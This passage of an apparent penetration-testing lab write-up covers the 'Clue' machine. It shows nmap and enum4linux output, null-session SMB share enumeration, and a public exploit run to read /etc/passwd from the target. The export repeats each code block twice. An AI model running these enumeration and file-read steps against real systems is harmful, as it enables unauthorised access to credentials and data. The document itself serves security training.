+Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-02-05T12:36:49
+|_  start_date: N/A
+|_clock-skew: mean: 1h40m01s, deviation: 2h53m14s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: clue
+|   NetBIOS computer name: CLUE\x00
+|   Domain name: pg
+|   FQDN: clue.pg
+|_  System time: 2026-02-05T07:36:50-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT     ADDRESS
+1   7.05 ms 192.168.45.1
+2   7.01 ms 192.168.45.254
+3   7.22 ms 192.168.251.1
+4   7.18 ms 192.168.233.240
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 167.31 seconds</code></pre></div>
+<p>Samba is open on the target machine and we can use <code class="inline-code">enum4linux</code> to enumerate the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ enum4linux 192.168.233.240
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb  5 07:38:56 2026
+
+ =========================================( Target Information )=========================================
+
+Target ........... 192.168.233.240
+RID Range ........ 500-550,1000-1050
+Username ......... &apos;&apos;
+Password ......... &apos;&apos;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on 192.168.233.240 )==========================
+
+
+[E] Can&apos;t find workgroup/domain
+
+
+
+ ==============================( Nbtstat Information for 192.168.233.240 )==============================
+
+Looking up status of 192.168.233.240
+No reply from 192.168.233.240
+
+ ==================================( Session Check on 192.168.233.240 )==================================
+
+
+[+] Server 192.168.233.240 allows sessions using username &apos;&apos;, password &apos;&apos;
+
+
+ ===============================( Getting domain SID for 192.168.233.240 )===============================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can&apos;t determine if host is part of domain or part of a workgroup
+
+
+ =================================( OS information on 192.168.233.240 )=================================
+
+
+[E] Can&apos;t get OS info with smbclient
+
+
+[+] Got OS info for 192.168.233.240 from srvinfo: 
+    CLUE           Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian
+    platform_id     :	500
+    os version      :	6.1
+    server type     :	0x809a03
+
+
+ ======================================( Users on 192.168.233.240 )======================================
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+
+ ================================( Share Enumeration on 192.168.233.240 )================================
+
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    backup          Disk      Backup web directory shares
+    IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    WORKGROUP            
+
+[+] Attempting to map shares on 192.168.233.240
+
+//192.168.233.240/print$	Mapping: DENIED Listing: N/A Writing: N/A
+//192.168.233.240/backup	Mapping: OK Listing: OK Writing: N/A
+
+[E] Can&apos;t understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//192.168.233.240/IPC$	Mapping: N/A Listing: N/A Writing: N/A
+
+ ==========================( Password Policy Information for 192.168.233.240 )==========================
+
+Password: 
+
+
+[+] Attaching to 192.168.233.240 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+    [+] CLUE
+    [+] Builtin
+
+[+] Password Info for Domain: CLUE
+
+    [+] Minimum password length: 5
+    [+] Password history length: None
+    [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
+    [+] Password Complexity Flags: 000000
+
+        [+] Domain Refuse Password Change: 0
+        [+] Domain Password Store Cleartext: 0
+        [+] Domain Password Lockout Admins: 0
+        [+] Domain Password No Clear Change: 0
+        [+] Domain Password No Anon Change: 0
+        [+] Domain Password Complex: 0
+
+    [+] Minimum password age: None
+    [+] Reset Account Lockout Counter: 30 minutes 
+    [+] Locked Account Duration: 30 minutes 
+    [+] Account Lockout Threshold: None
+    [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ =====================================( Groups on 192.168.233.240 )=====================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ =================( Users on 192.168.233.240 via RID cycling (RIDS: 500-550,1000-1050) )=================
+
+
+[I] Found new SID: 
+S-1-22-1
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[+] Enumerating users using SID S-1-5-21-371521109-471433649-4134737347 and logon username &apos;&apos;, password &apos;&apos;
+
+S-1-5-21-371521109-471433649-4134737347-501 CLUE\nobody (Local User)
+S-1-5-21-371521109-471433649-4134737347-513 CLUE\None (Domain Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username &apos;&apos;, password &apos;&apos;
+
+S-1-22-1-1000 Unix User\cassie (Local User)
+S-1-22-1-1001 Unix User\anthony (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username &apos;&apos;, password &apos;&apos;
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+ ==============================( Getting printer info for 192.168.233.240 )==============================
+
+No printers returned.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ enum4linux 192.168.233.240
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb  5 07:38:56 2026
+
+ =========================================( Target Information )=========================================
+
+Target ........... 192.168.233.240
+RID Range ........ 500-550,1000-1050
+Username ......... &apos;&apos;
+Password ......... &apos;&apos;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on 192.168.233.240 )==========================
+
+
+[E] Can&apos;t find workgroup/domain
+
+
+
+ ==============================( Nbtstat Information for 192.168.233.240 )==============================
+
+Looking up status of 192.168.233.240
+No reply from 192.168.233.240
+
+ ==================================( Session Check on 192.168.233.240 )==================================
+
+
+[+] Server 192.168.233.240 allows sessions using username &apos;&apos;, password &apos;&apos;
+
+
+ ===============================( Getting domain SID for 192.168.233.240 )===============================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can&apos;t determine if host is part of domain or part of a workgroup
+
+
+ =================================( OS information on 192.168.233.240 )=================================
+
+
+[E] Can&apos;t get OS info with smbclient
+
+
+[+] Got OS info for 192.168.233.240 from srvinfo: 
+    CLUE           Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian
+    platform_id     :	500
+    os version      :	6.1
+    server type     :	0x809a03
+
+
+ ======================================( Users on 192.168.233.240 )======================================
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+
+ ================================( Share Enumeration on 192.168.233.240 )================================
+
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    backup          Disk      Backup web directory shares
+    IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    WORKGROUP            
+
+[+] Attempting to map shares on 192.168.233.240
+
+//192.168.233.240/print$	Mapping: DENIED Listing: N/A Writing: N/A
+//192.168.233.240/backup	Mapping: OK Listing: OK Writing: N/A
+
+[E] Can&apos;t understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//192.168.233.240/IPC$	Mapping: N/A Listing: N/A Writing: N/A
+
+ ==========================( Password Policy Information for 192.168.233.240 )==========================
+
+Password: 
+
+
+[+] Attaching to 192.168.233.240 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+    [+] CLUE
+    [+] Builtin
+
+[+] Password Info for Domain: CLUE
+
+    [+] Minimum password length: 5
+    [+] Password history length: None
+    [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
+    [+] Password Complexity Flags: 000000
+
+        [+] Domain Refuse Password Change: 0
+        [+] Domain Password Store Cleartext: 0
+        [+] Domain Password Lockout Admins: 0
+        [+] Domain Password No Clear Change: 0
+        [+] Domain Password No Anon Change: 0
+        [+] Domain Password Complex: 0
+
+    [+] Minimum password age: None
+    [+] Reset Account Lockout Counter: 30 minutes 
+    [+] Locked Account Duration: 30 minutes 
+    [+] Account Lockout Threshold: None
+    [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ =====================================( Groups on 192.168.233.240 )=====================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ =================( Users on 192.168.233.240 via RID cycling (RIDS: 500-550,1000-1050) )=================
+
+
+[I] Found new SID: 
+S-1-22-1
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[+] Enumerating users using SID S-1-5-21-371521109-471433649-4134737347 and logon username &apos;&apos;, password &apos;&apos;
+
+S-1-5-21-371521109-471433649-4134737347-501 CLUE\nobody (Local User)
+S-1-5-21-371521109-471433649-4134737347-513 CLUE\None (Domain Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username &apos;&apos;, password &apos;&apos;
+
+S-1-22-1-1000 Unix User\cassie (Local User)
+S-1-22-1-1001 Unix User\anthony (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username &apos;&apos;, password &apos;&apos;
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+ ==============================( Getting printer info for 192.168.233.240 )==============================
+
+No printers returned.</code></pre></div>
+<p>From the output above, there is a share called <code class="inline-code">backups</code>. There are two local users on the machine called <code class="inline-code">cassie</code> and <code class="inline-code">anthony</code>.</p>
+<p>The <code class="inline-code">backup</code> share has <code class="inline-code">READ ONLY</code> access to us:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ smbmap -H 192.168.233.240                                       
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&apos; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&apos;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 192.168.233.240:445	Name: 192.168.233.240     	Status: NULL Session
+    Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    print$                                            	NO ACCESS	Printer Drivers
+    backup                                            	READ ONLY	Backup web directory shares
+    IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.5-Debian)
+[*] Closed 1 connections</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ smbmap -H 192.168.233.240                                       
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&apos; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&apos;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 192.168.233.240:445	Name: 192.168.233.240     	Status: NULL Session
+    Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    print$                                            	NO ACCESS	Printer Drivers
+    backup                                            	READ ONLY	Backup web directory shares
+    IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.5-Debian)
+[*] Closed 1 connections</code></pre></div>
+<p>Connecting to the share shows two more shares called <code class="inline-code">freeswitch</code> and <code class="inline-code">cassandra</code>. These directories look like the applications on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ smbclient //192.168.233.240/backup   
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Aug  5 04:43:50 2022
+  ..                                  D        0  Fri Aug  5 04:43:44 2022
+  freeswitch                          D        0  Fri Aug  5 04:43:51 2022
+  cassandra                           D        0  Fri May  6 11:04:47 2022
+
+        14343176 blocks of size 1024. 10599144 blocks available
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ smbclient //192.168.233.240/backup   
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Fri Aug <span class="hljs-number"> 5 </span>04:43:50 2022
+  ..                                  D       <span class="hljs-number"> 0 </span> Fri Aug <span class="hljs-number"> 5 </span>04:43:44 2022
+  freeswitch                          D       <span class="hljs-number"> 0 </span> Fri Aug <span class="hljs-number"> 5 </span>04:43:51 2022
+  cassandra                           D       <span class="hljs-number"> 0 </span> Fri May <span class="hljs-number"> 6 </span>11:04:47 2022
+
+       <span class="hljs-number"> 14343176 </span>blocks of size 1024.<span class="hljs-number"> 10599144 </span>blocks available
+smb: \&gt; 
+</code></pre></div>
+<p>Since there are plenty of files, we can use <code class="inline-code">recurse on</code> and <code class="inline-code">mget *</code> to download all accessible files inside both shares. I didn&apos;t find much. However, I found a working <a data-from-md="" title="https://www.exploit-db.com/exploits/49362" href="https://www.exploit-db.com/exploits/49362">exploit</a> to read files on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ python3 exp.py 192.168.233.240 &quot;/etc/passwd&quot; 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ntp:x:106:113::/nonexistent:/usr/sbin/nologin
+cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
+cassie:x:1000:1000::/home/cassie:/bin/bash
+freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
+anthony:x:1001:1001::/home/anthony:/bin/bash</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ python3 exp.py 192.168.233.240 &quot;/etc/passwd&quot; 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ntp:x:106:113::/nonexistent:/usr/sbin/nologin
+cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
+cassie:x:1000:1000::/home/cassie:/bin/bash
+freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
+anthony:x:1001:1001::/home/anthony:/bin/bash</code></pre></div>
+<p>When searching for the locations where the credentials can be stored for <code class="inline-code">freeswitch</code>, I obtained the following:<br/>
+<img src="data:image/png;base64,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